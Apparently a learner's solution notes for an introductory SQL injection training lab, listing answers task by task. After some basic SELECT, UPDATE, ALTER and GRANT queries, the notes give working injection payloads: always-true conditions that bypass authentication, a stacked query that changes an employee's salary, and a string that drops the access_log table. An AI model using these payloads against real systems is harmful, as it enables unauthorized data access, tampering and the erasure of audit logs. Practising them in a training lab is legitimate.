# SQL INJECTION INTRO

## Task 2

selecting

```
 query : SELECT department FROM employees WHERE first_name='Bob'
```

## Task 3

updating

```
 query : UPDATE employees SET department='Sales' WHERE first_name='Tobi'

```

## Task 4

Adding column

```
 query : ALTER TABLE employees ADD phone varchar(20)
```

## Task 5

```
query: GRANT all ON grant_rights TO unauthorized_user
```

## Task 9

```
first: '
```

```
second: or
```

```
third: '1'='1
```

# Task 10

```
Login_count: 0
User_Id: 0 OR 1=1
```

# Task 11

Getting employees data. First field could be any.

```
Employee Name: STH
Authentication TAN: ' OR '1' = '1

```

# Task 12

Vulnarable second field, first could be any, used DML update query to set salary

```
Employee Name: STH
```

```
Authentication TAN: '; UPDATE employees SET salary=99999 WHERE first_name='John
```

# Task 13

string: '; DROP TABLE access_log;--
